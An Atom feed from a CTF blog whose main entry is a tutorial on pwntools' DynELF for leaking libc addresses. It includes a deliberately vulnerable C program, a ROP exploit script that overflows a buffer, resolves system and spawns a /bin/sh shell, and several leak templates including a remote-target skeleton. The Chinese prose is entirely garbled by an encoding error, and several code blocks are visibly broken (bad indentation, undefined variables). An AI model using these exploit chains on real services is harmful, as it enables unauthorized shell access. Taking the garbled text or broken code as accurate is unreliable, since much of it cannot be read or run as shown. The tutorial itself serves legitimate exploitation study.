<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ixout&#39;s blog</title>
  
  
  <link href="https://ixout.github.io/atom.xml" rel="self"/>
  
  <link href="https://ixout.github.io/"/>
  <updated>2023-03-27T14:17:47.119Z</updated>
  <id>https://ixout.github.io/</id>
  
  <author>
    <name>ixout</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>buuctfåˆ·é¢˜è®°å½•-2</title>
    <link href="https://ixout.github.io/posts/14188/"/>
    <id>https://ixout.github.io/posts/14188/</id>
    <published>2023-03-27T06:12:13.000Z</published>
    <updated>2023-03-27T14:17:47.119Z</updated>
    
    
    <summary type="html">ç»§ç»­</summary>
    
    
    
    <category term="é¢˜è§£" scheme="https://ixout.github.io/categories/%E9%A2%98%E8%A7%A3/"/>
    
    
    <category term="wp" scheme="https://ixout.github.io/tags/wp/"/>
    
    <category term="åˆ·é¢˜è®°å½•" scheme="https://ixout.github.io/tags/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
    <category term="buuctf" scheme="https://ixout.github.io/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>pwnæŠ€å·§-DynELF</title>
    <link href="https://ixout.github.io/posts/69471/"/>
    <id>https://ixout.github.io/posts/69471/</id>
    <published>2023-03-26T04:39:50.000Z</published>
    <updated>2023-03-26T13:24:44.476Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DynELFï¼Ÿ"><a href="#DynELFï¼Ÿ" class="headerlink" title="DynELFï¼Ÿ"></a>DynELFï¼Ÿ</h1><p>DynELFæ˜¯pwntoolsä¸­ä¸“é—¨ç”¨æ¥åº”å¯¹æ²¡æœ‰libcæƒ…å†µçš„æ¼æ´åˆ©ç”¨æ¨¡å—ï¼Œåœ¨æä¾›ä¸€ä¸ªç›®æ ‡ç¨‹åºä»»æ„åœ°å€å†…å­˜æ³„æ¼å‡½æ•°çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥è§£æä»»æ„åŠ è½½åº“çš„ä»»æ„ç¬¦å·åœ°å€ã€‚</p><p><strong>å…¶åŸç†å°±æ˜¯é€šè¿‡ç¨‹åºæ¼æ´æ³„éœ²å‡ºä»»æ„åœ°å€å†…å®¹ï¼Œç»“åˆELFæ–‡ä»¶çš„ç»“æ„ç‰¹å¾è·å–å¯¹åº”ç‰ˆæœ¬æ–‡ä»¶å¹¶è®¡ç®—å¯¹æ¯”å‡ºç›®æ ‡ç¬¦å·åœ¨å†…å­˜ä¸­çš„åœ°å€</strong></p><h2 id="é€‚ç”¨æƒ…å†µ"><a href="#é€‚ç”¨æƒ…å†µ" class="headerlink" title="é€‚ç”¨æƒ…å†µ"></a>é€‚ç”¨æƒ…å†µ</h2><p>DynELFæ³„éœ²å‡½æ•°æ–¹æ³•æœ€æ–¹ä¾¿çš„ä½¿ç”¨æƒ…å†µæ˜¯ç¨‹åºä¸­æœ€å¥½å«æœ‰writeå‡½æ•°ä¸”å¯ä»¥å¤šæ¬¡è°ƒç”¨mainå‡½æ•°ï¼Œä¸ç„¶çš„è¯è¿˜æ˜¯ç”¨LibcSearcherçš„æ–¹æ³•æ³„éœ²æ¯”è¾ƒå¥½</p><h1 id="å¼•ä¾‹"><a href="#å¼•ä¾‹" class="headerlink" title="å¼•ä¾‹"></a>å¼•ä¾‹</h1><h2 id="å®˜æ–¹æ–‡æ¡£ç»™çš„ä¾‹å­"><a href="#å®˜æ–¹æ–‡æ¡£ç»™çš„ä¾‹å­" class="headerlink" title="å®˜æ–¹æ–‡æ¡£ç»™çš„ä¾‹å­"></a>å®˜æ–¹æ–‡æ¡£ç»™çš„ä¾‹å­</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Assume a process or remote connection</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwnme&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Declare a function that takes a single address, and</span></span><br><span class="line"><span class="comment"># leaks at least one byte at that address.</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">address</span>):</span><br><span class="line">    data = p.read(address, <span class="number">4</span>)</span><br><span class="line">    log.debug(<span class="string">&quot;%#x =&gt; %s&quot;</span>, address, enhex(data <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="comment"># For the sake of this example, let&#x27;s say that we</span></span><br><span class="line"><span class="comment"># have any of these pointers.  One is a pointer into</span></span><br><span class="line"><span class="comment"># the target binary, the other two are pointers into libc</span></span><br><span class="line">main   = <span class="number">0xfeedf4ce</span></span><br><span class="line">libc   = <span class="number">0xdeadb000</span></span><br><span class="line">system = <span class="number">0xdeadbeef</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># With our leaker, and a pointer into our target binary,</span></span><br><span class="line"><span class="comment"># we can resolve the address of anything.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># We do not actually need to have a copy of the target</span></span><br><span class="line"><span class="comment"># binary for this to work.</span></span><br><span class="line">d = DynELF(leak, main)</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="literal">None</span>,     <span class="string">&#x27;libc&#x27;</span>) == libc</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>) == system</span><br><span class="line"></span><br><span class="line"><span class="comment"># However, if we *do* have a copy of the target binary,</span></span><br><span class="line"><span class="comment"># we can speed up some of the steps.</span></span><br><span class="line">d = DynELF(leak, main, elf=ELF(<span class="string">&#x27;./pwnme&#x27;</span>))</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="literal">None</span>,     <span class="string">&#x27;libc&#x27;</span>) == libc</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>) == system</span><br><span class="line"></span><br><span class="line"><span class="comment"># Alternately, we can resolve symbols inside another library,</span></span><br><span class="line"><span class="comment"># given a pointer into it.</span></span><br><span class="line">d = DynELF(leak, libc + <span class="number">0x1234</span>)</span><br><span class="line"><span class="keyword">assert</span> d.lookup(<span class="string">&#x27;system&#x27;</span>)      == system</span><br></pre></td></tr></table></figure><p><strong>log.debug(â€œ%#x =&gt; %sâ€, address, enhex(data or â€˜â€™))è§£é‡Š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">log.debugæ˜¯pwntoolsä¸­çš„æ—¥å¿—å·¥å…·ï¼Œ%#xè¡¨ç¤ºè¾“å‡ºä¸€ä¸ªæ•´æ•°çš„åå…­è¿›åˆ¶è¡¨ç¤ºï¼ˆå¸¦æœ‰0xå‰ç¼€ï¼‰ï¼Œ%sè¡¨ç¤ºè¾“å‡ºä¸€ä¸ªå­—ç¬¦ä¸²ã€‚addressæ˜¯è¦è¾“å‡ºçš„å†…å­˜åœ°å€ï¼Œdataæ˜¯è¯¥åœ°å€å¯¹åº”çš„æ•°æ®ï¼ˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼‰ï¼Œenhexæ˜¯pwntoolsä¸­çš„å·¥å…·å‡½æ•°ï¼Œç”¨äºå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºåå…­è¿›åˆ¶è¡¨ç¤ºçš„å­—ç¬¦ä¸²ï¼ˆæ¯ä¸ªå­—èŠ‚ç”¨ä¸¤ä¸ªåå…­è¿›åˆ¶å­—ç¬¦è¡¨ç¤ºï¼‰ï¼Œä¸encode(&#x27;hex&#x27;)ç›¸ä¼¼ã€‚</span><br><span class="line">æ•´ä¸ªè¾“å‡ºç»“æœç±»ä¼¼äºï¼š[DEBUG] 0x12345678 =&gt; 6162636465666768</span><br><span class="line">(data or &#x27;&#x27;)çš„ä½œç”¨æ˜¯ï¼Œå½“dataå˜é‡ä¸ºç©ºï¼ˆNoneï¼‰æˆ–è€…ä¸ºFalseæ—¶ï¼Œè¿”å›ä¸€ä¸ªç©ºå­—ç¬¦ä¸²&#x27;&#x27;ï¼Œå¦åˆ™è¿”å›dataæœ¬èº«ã€‚</span><br></pre></td></tr></table></figure><h2 id="ä¸€ä¸ªæ›´å…·ä½“çš„ä¾‹å­"><a href="#ä¸€ä¸ªæ›´å…·ä½“çš„ä¾‹å­" class="headerlink" title="ä¸€ä¸ªæ›´å…·ä½“çš„ä¾‹å­"></a>ä¸€ä¸ªæ›´å…·ä½“çš„ä¾‹å­</h2><p><strong>æºä»£ç </strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vulfun</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span>&#123;</span><br><span class="line">    vulfun();</span><br><span class="line">    write(STDOUT_FILENO, <span class="string">&quot;Hello,World\n&quot;</span>, <span class="number">13</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf  = ELF(<span class="string">&#x27;elf&#x27;</span>)</span><br><span class="line">plt_write = elf.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">plt_read = elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">vulfun_addr = <span class="number">0x08048404</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">address</span>):</span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">140</span> + p32(plt_write) + p32(vulfun_addr) + p32(<span class="number">1</span>) + p32(address) + p32(<span class="number">4</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">data = p.recv(<span class="number">4</span>)</span><br><span class="line"><span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./elf&#x27;</span>)</span><br><span class="line">d=DynELF(leak, ptr)</span><br><span class="line">system_addr = d.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x0804a018</span></span><br><span class="line">pppr = <span class="number">0x080484bd</span></span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">140</span> + p32(plt_read) + p32(pppr) + p32(<span class="number">0</span>) + p32(bss_addr) + p32(<span class="number">8</span>) + p32(system_addr) + p32(vulfun_addr) + p32(bss_addr) <span class="comment">#è¿™é‡Œè—äº†ä¸€ä¸ªä¹‹å‰æ²¡æ³¨æ„è¿‡çš„çŸ¥è¯†ç‚¹â‘ </span></span><br><span class="line">p.send(payload2)</span><br><span class="line">p.send(<span class="string">&quot;/bin/sh\0&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><details class="folding-tag" red><summary> â‘  </summary>              <div class='content'>              <p>ä¸Šé¢çš„expä½¿ç”¨äº†ä¸€ä¸ªpppr(å…¶å®å°±æ˜¯pop-pop-pop-ret),ä½œä¸ºreadçš„è¿”å›åœ°å€,è¿™ä¸ªæ˜¯å¾ˆæœ‰å¿…è¦çš„,é‰´äº32ä½ä¸‹è¿”å›åœ°å€å’Œå‚æ•°çš„äº’é€šæ€§(64ä½ä¹Ÿä¼šä½†ä¸€èˆ¬éƒ½ä¸ä¼šè¶…è¿‡6ä¸ªå‚æ•°ï¼‰,å¦‚æœreadåç›´æ¥æ¥éœ€è¦çš„å‡½æ•°åœ°å€é‚£ä¹ˆreadçš„å‚æ•°åˆä¼šå˜ä¸ºæ‰€éœ€å‡½æ•°çš„è¿”å›åœ°å€å’Œå‚æ•°,è¿™æ˜¾ç„¶ä¸æ˜¯æˆ‘ä»¬æ‰€å¸Œæœ›çš„,äºæ˜¯é€šè¿‡pppræ¥<strong>é‡æ–°åˆ’åˆ†å‡½æ•°æ ˆ</strong></p>              </div>            </details><h1 id="åŸºç¡€æ¡†æ¶"><a href="#åŸºç¡€æ¡†æ¶" class="headerlink" title="åŸºç¡€æ¡†æ¶"></a>åŸºç¡€æ¡†æ¶</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">p = remote(ip, port)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">addr</span>):</span><br><span class="line">       payload2leak_addr = â€œ****â€ + pack(addr) + â€œ****â€</span><br><span class="line">       p.send(payload2leak_addr)</span><br><span class="line">       data = p.recv()</span><br><span class="line">       <span class="keyword">return</span> data</span><br><span class="line"> </span><br><span class="line">d = DynELF(leak, pointer = pointer_into_ELF_file, elf = ELFObject)</span><br><span class="line">system_addr = d.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line">read_add = d.lookup(<span class="string">&#x27;read&#x27;</span>,<span class="string">&#x27;libc&#x27;</span>)</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨DynELFæ—¶ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨ä¸€ä¸ª<strong>leakå‡½æ•°</strong>ä½œä¸º<strong>å¿…é€‰å‚æ•°</strong>ï¼Œ<u>æŒ‡å‘ELFæ–‡ä»¶çš„æŒ‡é’ˆæˆ–è€…ä½¿ç”¨ELFç±»åŠ è½½çš„ç›®æ ‡æ–‡ä»¶è‡³å°‘æä¾›ä¸€ä¸ªä½œä¸ºå¯é€‰å‚æ•°</u>ï¼Œä»¥åˆå§‹åŒ–ä¸€ä¸ªDynELFç±»çš„å®ä¾‹dã€‚ç„¶åå°±å¯ä»¥é€šè¿‡è¿™ä¸ªå®ä¾‹dçš„æ–¹æ³•lookupæ¥æœå¯»libcåº“å‡½æ•°äº†ï¼›<br>å…¶ä¸­ï¼Œ<strong>leakå‡½æ•°éœ€è¦ä½¿ç”¨ç›®æ ‡ç¨‹åºæœ¬èº«çš„æ¼æ´æ³„éœ²å‡ºç”±DynELFç±»ä¼ å…¥çš„<u>intå‹å‚æ•°addr</u><u>å¯¹åº”çš„å†…å­˜åœ°å€ä¸­çš„æ•°æ®</u>ã€‚</strong>ä¸”ç”±äºDynELFä¼šå¤šæ¬¡è°ƒç”¨leakå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°<u>å¿…é¡»èƒ½ä»»æ„æ¬¡ä½¿ç”¨</u>ï¼Œå³ä¸èƒ½æ³„éœ²å‡ ä¸ªåœ°å€ä¹‹åå°±å¯¼è‡´ç¨‹åºå´©æºƒã€‚<strong>ç”±äºéœ€è¦æ³„éœ²æ•°æ®</strong>ï¼Œ<strong>payloadä¸­å¿…ç„¶åŒ…å«ç€æ‰“å°å‡½æ•°ï¼Œå¦‚write, puts, printfç­‰</strong>ï¼›<br>è€Œé€šè¿‡å®è·µå‘ç°<strong>writeå‡½æ•°æ˜¯æœ€ç†æƒ³çš„</strong>ï¼Œå› ä¸ºwriteå‡½æ•°çš„ç‰¹ç‚¹åœ¨äº<strong>å…¶è¾“å‡ºå®Œå…¨ç”±å…¶å‚æ•°sizeå†³å®š</strong>ï¼Œåªè¦ç›®æ ‡åœ°å€å¯è¯»ï¼Œ<strong>sizeå¡«å¤šå°‘å°±è¾“å‡ºå¤šå°‘ï¼Œä¸ä¼šå—åˆ°è¯¸å¦‚â€˜\0â€™, â€˜\nâ€™ä¹‹ç±»çš„å­—ç¬¦å½±å“</strong>ï¼›<u>è€Œputs, printfå‡½æ•°ä¼šå—åˆ°è¯¸å¦‚â€˜\0â€™, â€˜\nâ€™ä¹‹ç±»çš„å­—ç¬¦å½±å“ï¼Œåœ¨å¯¹æ•°æ®çš„è¯»å–å’Œå¤„ç†æœ‰ä¸€å®šçš„éš¾åº¦</u></p><p>ç»“åˆä¸Šé¢çš„å¼•ä¾‹ï¼Œå¯¹DynELFåº”è¯¥èƒ½æœ‰ä¸€ä¸ªåŸºç¡€è®¤è¯†</p><h1 id="leakæ¨¡æ¿"><a href="#leakæ¨¡æ¿" class="headerlink" title="leakæ¨¡æ¿"></a>leakæ¨¡æ¿</h1><h2 id="Writeå‡½æ•°æ¨¡æ¿"><a href="#Writeå‡½æ•°æ¨¡æ¿" class="headerlink" title="Writeå‡½æ•°æ¨¡æ¿"></a>Writeå‡½æ•°æ¨¡æ¿</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">address</span>):</span><br><span class="line"><span class="comment">#addressæ˜¯å¾…æ³„éœ²çš„åœ°å€</span></span><br><span class="line">    payload = offset + p32(write) + p32(main_addr) + p32(<span class="number">1</span>) + p32(address) + p32(<span class="number">4</span>)</span><br><span class="line">    <span class="comment">#payload = æº¢å‡ºä½ + write\puts\printf + è¿”å›åœ°å€ + å‚æ•°1 + å‚æ•°2 + å‚æ•°3</span></span><br><span class="line">    sh.sendline(payload)</span><br><span class="line">    data = sh.recv(<span class="number">4</span>) </span><br><span class="line">    <span class="comment">#ç”¨äºæ¥å—è¿”å›çš„åœ°å€ï¼Œ32ä½æ¥æ”¶4ä½ï¼Œ64ä½æ¥æ”¶8ä½</span></span><br><span class="line">log.success(<span class="string">&#x27;%x -&gt; %s&#x27;</span>%(address,<span class="built_in">hex</span>(u32(data))))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">libc = DynELF(leak, elf=ELF(file_path))</span><br><span class="line"><span class="comment">#åˆå§‹åŒ–DynELFæ¨¡å—ï¼Œä¹Ÿå°±æ˜¯ç¨‹åºçš„elfå˜é‡</span></span><br><span class="line">system_addr = libc.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line"><span class="comment">#åœ¨libcæ–‡ä»¶ä¸­æœç´¢system</span></span><br></pre></td></tr></table></figure><h2 id="putså‡½æ•°æ¨¡æ¿"><a href="#putså‡½æ•°æ¨¡æ¿" class="headerlink" title="putså‡½æ•°æ¨¡æ¿"></a>putså‡½æ•°æ¨¡æ¿</h2><p>puts å‡½æ•°ä½¿ç”¨çš„å‚æ•°åªæœ‰ä¸€ä¸ªï¼Œå³éœ€è¦è¾“å‡ºçš„æ•°æ®çš„èµ·å§‹åœ°å€ï¼Œ<strong>å®ƒä¼šä¸€ç›´è¾“å‡ºç›´åˆ°é‡åˆ° <u>\x00</u></strong>ï¼Œæ‰€ä»¥å®ƒè¾“å‡ºçš„æ•°æ®é•¿åº¦æ˜¯<u>ä¸å®¹æ˜“æ§åˆ¶</u>çš„ï¼Œæˆ‘ä»¬æ— æ³•é¢„æ–™åˆ°é›¶å­—ç¬¦ä¼šå‡ºç°åœ¨å“ªé‡Œï¼Œæˆªæ­¢åï¼Œ<strong>puts è¿˜ä¼šè‡ªåŠ¨åœ¨æœ«å°¾åŠ ä¸Šæ¢è¡Œç¬¦</strong> ã€‚<strong>è¯¥å‡½æ•°çš„ä¼˜ç‚¹æ˜¯åœ¨ 64 ä½ç¨‹åºä¸­ä¹Ÿå¯ä»¥å¾ˆæ–¹ä¾¿åœ°ä½¿ç”¨ã€‚**</strong>ç¼ºç‚¹æ˜¯ä¼šå—åˆ°é›¶å­—ç¬¦æˆªæ–­çš„å½±å“**ï¼Œåœ¨å†™ leak å‡½æ•°æ—¶éœ€è¦ç‰¹æ®Šå¤„ç†ï¼Œåœ¨æ‰“å°å‡ºçš„æ•°æ®ä¸­æ­£ç¡®åœ°ç­›é€‰æˆ‘ä»¬éœ€è¦çš„éƒ¨åˆ†ï¼Œå¦‚æœæ‰“å°å‡ºäº†ç©ºå­—ç¬¦ä¸²ï¼Œåˆ™è¦æ‰‹åŠ¨èµ‹å€¼<code>\x00</code>ï¼ŒåŒ…æ‹¬æˆ‘ä»¬åœ¨ dump å†…å­˜çš„æ—¶å€™ï¼Œä¹Ÿå¸¸å¸¸å—è¿™ä¸ªé—®é¢˜çš„å›°æ‰°ï¼Œ</p><h2 id="Putså‡½æ•°åæ²¡æœ‰å…¶ä»–è¾“å‡º"><a href="#Putså‡½æ•°åæ²¡æœ‰å…¶ä»–è¾“å‡º" class="headerlink" title="Putså‡½æ•°åæ²¡æœ‰å…¶ä»–è¾“å‡º"></a><code>Puts</code>å‡½æ•°åæ²¡æœ‰å…¶ä»–è¾“å‡º</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">address</span>):</span><br><span class="line">  count = <span class="number">0</span></span><br><span class="line">  data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">  payload = p32(puts_plt_addr) + p32(main_addr) + p32(address)</span><br><span class="line">  sh.send(payload)</span><br><span class="line">  <span class="built_in">print</span> sh.recvuntil(<span class="string">&#x27;xxx\n&#x27;</span>) <span class="comment">#ä¸€å®šè¦åœ¨putså‰é‡Šæ”¾å®Œè¾“å‡º</span></span><br><span class="line">  up = <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    c = sh.recv(numb=<span class="number">1</span>, timeout=<span class="number">1</span>) </span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> up == <span class="string">&#x27;\n&#x27;</span> <span class="keyword">and</span> c == <span class="string">&quot;&quot;</span>:  </span><br><span class="line">      buf = buf[:-<span class="number">1</span>]             </span><br><span class="line">      buf += <span class="string">&quot;\x00&quot;</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      buf += c</span><br><span class="line">    up = c</span><br><span class="line">  data = buf[:<span class="number">4</span>]  </span><br><span class="line">  log.info(<span class="string">&quot;%#x =&gt; %s&quot;</span> % (address, (data <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>).encode(<span class="string">&#x27;hex&#x27;</span>)))</span><br><span class="line">  <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure><h2 id="Putså‡½æ•°åç¨‹åºè¿˜æœ‰å…¶ä»–è¾“å‡º"><a href="#Putså‡½æ•°åç¨‹åºè¿˜æœ‰å…¶ä»–è¾“å‡º" class="headerlink" title="Putså‡½æ•°åç¨‹åºè¿˜æœ‰å…¶ä»–è¾“å‡º"></a><code>Puts</code>å‡½æ•°åç¨‹åºè¿˜æœ‰å…¶ä»–è¾“å‡º</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">address</span>):</span><br><span class="line">  count = <span class="number">0</span></span><br><span class="line">  data = <span class="string">&quot;&quot;</span></span><br><span class="line">  payload = xxx</span><br><span class="line">  sh.send(payload)</span><br><span class="line">  <span class="built_in">print</span> sh.recvuntil(<span class="string">&quot;xxx\n&quot;</span>) <span class="comment">#ä¸€å®šè¦åœ¨putså‰é‡Šæ”¾å®Œè¾“å‡º</span></span><br><span class="line">  up = <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    c = sh.recv(<span class="number">1</span>)</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> up == <span class="string">&#x27;\n&#x27;</span> <span class="keyword">and</span> c == <span class="string">&quot;x&quot;</span>:  <span class="comment">#ä¸€å®šè¦æ‰¾åˆ°æ³„æ¼ä¿¡æ¯çš„å­—ç¬¦ä¸²ç‰¹å¾</span></span><br><span class="line">      data = buf[:-<span class="number">1</span>]                     </span><br><span class="line">      data += <span class="string">&quot;\x00&quot;</span></span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      buf += c</span><br><span class="line">    up = c</span><br><span class="line">  data = buf[:<span class="number">4</span>] </span><br><span class="line">  log.info(<span class="string">&quot;%#x =&gt; %s&quot;</span> % (address, (data <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>).encode(<span class="string">&#x27;hex&#x27;</span>)))</span><br><span class="line">  <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure><h1 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h1><p>äº†è§£ä¸€ä¸‹,è¦æ±‚ä¸é«˜</p><h2 id="è·å–elfå†…å­˜åŠ è½½åŸºåœ°å€"><a href="#è·å–elfå†…å­˜åŠ è½½åŸºåœ°å€" class="headerlink" title="è·å–elfå†…å­˜åŠ è½½åŸºåœ°å€"></a>è·å–elfå†…å­˜åŠ è½½åŸºåœ°å€</h2><p>å·²çŸ¥elfåŠ è½½å†…å­˜èŒƒå›´å†…çš„ä¸€ä¸ªåœ°å€ptrï¼Œå°†è¯¥åœ°å€è¿›è¡Œé¡µå¯¹é½</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">page_size = 0x1000page_mask = ~(page_size - 1)ptr &amp;= page_mask</span><br></pre></td></tr></table></figure><p>ç„¶åå¯¹æ¯”å†…å­˜é¡µèµ·å§‹å­—ç¬¦ä¸²æ˜¯å¦ä¸ºâ€™\x7fELFâ€™ï¼Œå¦‚æœä¸æ˜¯ï¼Œä¸€ç›´å‘ä½åœ°å€å†…å­˜é¡µ(ptr -= page_size)è¿›è¡ŒæŸ¥æ‰¾ï¼Œæ‰¾åˆ°ç¬¦åˆè¯¥æ¡ä»¶çš„é¡µé¢ï¼Œè¯¥é¡µé¢èµ·å§‹åœ°å€å°±æ˜¯elfæ–‡ä»¶å†…å­˜åŠ è½½åŸºåœ°å€ã€‚</p><p>å¯»æ‰¾elfå†…å­˜åŠ è½½åŸºåœ°å€çš„ç¤ºæ„å›¾å¦‚ä¸‹ï¼š</p><p><img 